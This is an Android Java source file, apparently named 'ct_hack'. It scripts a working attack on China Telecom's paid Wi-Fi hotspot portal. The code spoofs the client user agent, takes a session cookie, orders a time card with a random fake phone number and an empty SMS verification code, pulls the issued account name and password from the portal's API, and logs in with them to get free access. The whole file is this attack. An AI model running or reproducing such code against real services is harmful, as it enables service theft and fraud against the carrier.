package snc.lsr.ct_hack;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;

import android.content.Context;
import android.widget.TextView;
import lsr.HttpRequester;
import lsr.HttpRespons;
class a{
    public MToast _t;
    public TextView console;
    public void t(String msg){
    	_t.t(msg);
    }
	public void addT(String t){
		console.setText(console.getText()+t+"\n");
	}
	public void setT(String t){
		console.setText(t);
	}
	public a(Context mt,TextView c){
		_t = new MToast(mt);
		console=c;
	}
}
public class Hack {
	a b;
	public Hack(Context mt,TextView c){
		b=new a(mt,c);
	}
	public static final String[] phone_num_head 
			= {"135", "136", "137", "138", "139", "147", "150", "151", "152", "157", "158", "159", 
			   "182", "183", "184", "187", "188", "130", "131", "132", "155", "156", "185", "186", 
			   "133", "153", "180", "181", "189"};
	
	public boolean hack(){
		try {
	            HttpRequester request = new HttpRequester();
	            HttpRequester addGood = new HttpRequester();
	            HttpRequester openCart = new HttpRequester();
	            HttpRequester reqAc = new HttpRequester();
	            
	            URL url = new java.net.URL("http://www.baidu.com");
		        URL loginUrl = new java.net.URL("http://wifi.189.cn/service/index.jsp");
		        
				HttpURLConnection loginConnection = null;
	            HttpURLConnection connection = (java.net.HttpURLConnection)url.openConnection();
	            connection.setRequestProperty("User-Agent", "CDMA+WLAN");
	            
	            Map<String,String> map1 = new HashMap<String,String>();
	            Map<String,String> map2 = new HashMap<String,String>();
	            Map<String,String> map3 = new HashMap<String,String>();
	            Map<String,String> map4 = new HashMap<String,String>();
	            Map<String,String> map5 = new HashMap<String,String>();
	            
	            map1.put("method","addGood");
	            map1.put("confirm", "yes");
	            map1.put("cardId", "1");
	            map1.put("type", "1");
	            map1.put("count", "1");
	            map2.put("method", "list");
	            map3.put("method", "buy");
	            map3.put("confirm", "yes");
	            map3.put("shopCartFlag", "shopCart");
	            map3.put("cardType", "1");
	            map3.put("cardPayType", "yi");
	            map3.put("user_phone", "");
	            map3.put("smsVerifyCode", "");
	            map3.put("isBenJi", "no");
	            map4.put("method", "get10mCard");
	            
	            connection.connect();
	            int status_code = connection.getResponseCode();
	            if(status_code==302)
	            {
	            	String location = connection.getHeaderField("Location");
		            b.addT("获取到的登录地址："+location);
		            URL redUrl = new URL(location);
		            HttpURLConnection redConnection = (java.net.HttpURLConnection)redUrl.openConnection();
		            redConnection.setRequestProperty("User-Agent", "CDMA+WLAN");
	            	String newLocation = redConnection.getHeaderField("Location");
		            HttpRespons hr2 = request.makeContent(newLocation, redConnection); 
		            System.out.println(hr2.getContent());
		            
		            connection.disconnect();
		            
		            loginConnection = (HttpURLConnection) loginUrl.openConnection();
		            loginConnection.setRequestMethod("GET");
		            loginConnection.setRequestProperty("user-agent", "CDMA+WLAN");
		            loginConnection.setUseCaches(false);
		    		
		    		loginConnection.connect();
		    		b.addT("开始模拟购买时长卡");
		            String cookie = (loginConnection.getHeaderField("Set-Cookie")).substring(0,46);
		            System.out.println("获得的 cookie："+cookie+"\n");
		            b.addT("获得的 cookie："+cookie);
		    		
		            loginConnection.disconnect();
		            b.addT("开始模拟向购物车添加物品...\n");
		            addGood.sendGet("http://wifi.189.cn/service/cart.do",map1,cookie);
		            b.addT("打开购物车，使请求有效化...");
		            openCart.sendGet("http://wifi.189.cn/service/cart.do",map2,cookie);

		            Random random = new Random();
		            String phone_num = "131";
		            for(int i=1;i<=8;i++)
		            	phone_num = phone_num + String.valueOf(random.nextInt(10));
		            
		            map3.put("phone", phone_num);
		            map3.put("phone_1", phone_num);
		            b.addT("开始获取订单号，手机号："+phone_num+"...");
		            HttpRespons data = openCart.sendGet("http://wifi.189.cn/service/user.do",map3,cookie);
		            String orderNum = data.getContent().substring(2);
		            b.addT("得到的订单号："+orderNum);
		            b.addT("开始获取账号密码...");
		            map4.put("orderId", orderNum);
		            HttpRespons key = reqAc.sendGet("http://wifi.189.cn/clientApi.do",map4);
		            String receData = key.getContent();
		            b.addT("收到的数据："+receData);
		            String acc = receData.substring(11, 23);
	                String pss = receData.substring(24);
		            System.out.println(acc);
		            System.out.println(pss);
		            b.addT("开始登录...");
		           
		            map5.put("UserName", acc+"@wlan.sh.chntel.com");
		            map5.put("Password", pss);

				    URLConnection loginC = new URL("https://wlan.ct10000.com/portal/wispr.login?NasType=Huawei-NasName=BJ-JA-SR-1.M.ME60").openConnection();
				    loginC.setRequestProperty("user-agent", "CDMA+WLAN");
				    loginC.setRequestProperty("method", "POST");
				    loginC.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
//				    
		            loginC.setDoOutput(true);
		            loginC.setDoInput(true);
		            
					StringBuffer param = new StringBuffer();
						param.append("&");
						param.append("UserName").append("=").append(acc+"@wlan.sh.chntel.com");
						param.append("&");
						param.append("Password").append("=").append(pss);
					loginC.getOutputStream().write(param.toString().getBytes());
					loginC.getOutputStream().flush();
					loginC.getOutputStream().close();
					
		            HttpURLConnection testC = (HttpURLConnection)new java.net.URL("http://www.baidu.com").openConnection();
		            testC.connect();
		            if(testC.getResponseCode()==200)
		            {
		            	String msg="登录成功！九分半后开始切换账号";
		            	b.addT(msg);
		            	b.t(msg);
		            	return false;
		            }
		            else{

		            b.addT("登录失败，一秒后再次尝试登录...");
		            int i = 1;
		            do{i++;}while(i<10000);
		            
				    URLConnection loginC2 = new URL("https://wlan.ct10000.com/portal/wispr.login?NasType=Huawei-NasName=BJ-JA-SR-1.M.ME60").openConnection();
				    loginC2.setRequestProperty("user-agent", "CDMA+WLAN");
				    loginC2.setRequestProperty("method", "POST");
				    loginC2.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
		            loginC2.setDoOutput(true);
		            loginC2.setDoInput(true);
		            
					StringBuffer param2 = new StringBuffer();
						param2.append("&");
						param2.append("UserName").append("=").append(acc+"@wlan.sh.chntel.com");
						param2.append("&");
						param2.append("Password").append("=").append(pss);
					loginC2.getOutputStream().write(param2.toString().getBytes());
					loginC2.getOutputStream().flush();
					loginC2.getOutputStream().close();

					return true;
		            }
	            }else if(status_code==200){
	            	String msg="您现在已连接到网络，无需破解\n";
	            	b.addT(msg);
	            	b.t(msg);
	            	return false;
	            }
	        } catch (Exception e) {
	        	b.addT("请求出错: " + e.getMessage() + ",请检查网络连接");
	            e.printStackTrace();
	            return true;
	        }
		return false;  
	}
}
